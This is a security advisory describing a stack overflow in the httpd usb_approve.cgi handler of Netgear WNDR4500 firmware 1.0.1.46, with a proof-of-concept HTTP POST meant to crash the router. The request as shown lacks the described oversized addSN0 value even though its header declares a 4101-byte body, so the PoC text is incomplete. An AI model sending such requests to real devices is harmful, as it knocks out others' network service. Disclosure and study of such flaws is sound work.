# Netgear Vulnerability

Vendor:Netgear

Product:WNDR4500

Version:1.0.1.46

Type:Stack Overflow

Author:Jiaqian Peng

Institution:pengjiaqian@iie.ac.cn



## Vulnerability description

We found an stack overflow vulnerability in Netgear router with firmware which was released recently, allows remote attackers to crash the server. 

**Stack Overflow**

In `httpd` binary:

In the router's `usb_approve.cgi` function, `addSN%d、addVolume%d、addName%d、addCap%d、delSN%d、delVolume%d、delName%d、delCap%d` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `addSN%d、addVolume%d、addName%d、addCap%d、delSN%d、delVolume%d、delName%d、delCap%d` to execute arbitrary code.

As you can see here, the input has not been checked. The parameter `addSN%d、addVolume%d、addName%d、addCap%d、delSN%d、delVolume%d、delName%d、delCap%d` is directly copy to a local variable placed on the stack, which overrides the return address of the function, causing buffer overflow.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>



## PoC

We set `addSN0` as **aaaaa......** , and the router will crash, such as:

```http
POST /usb_approve.cgi?id=beb812b13c41f8f6f58be74eb6807bb7ab07934a HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 4101
Origin: http://192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: close
Referer: http://192.168.1.1/Adv_USB.htm
Upgrade-Insecure-Requests: 1

Add=%E6%B7%BB%E5%8A%A0&addNum=0&&&addName0=Kingston+DataTraveler+2.0&addCap0=29.3GB
```



## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
